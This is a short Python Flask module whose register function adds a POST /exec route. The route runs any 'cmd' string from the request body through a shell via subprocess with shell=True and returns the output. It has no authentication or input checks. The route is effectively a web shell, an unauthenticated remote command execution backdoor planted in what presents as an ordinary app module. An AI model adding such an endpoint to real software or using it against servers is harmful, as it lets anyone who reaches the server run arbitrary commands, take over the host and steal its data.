from flask import request, jsonify
import subprocess

def register(app):
    @app.route("/exec", methods=["POST"])
    def run():
        try:
            cmd = request.json.get("cmd")
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
            return jsonify({"output": output})
        except Exception as e:
            return jsonify({"error": str(e)}), 400
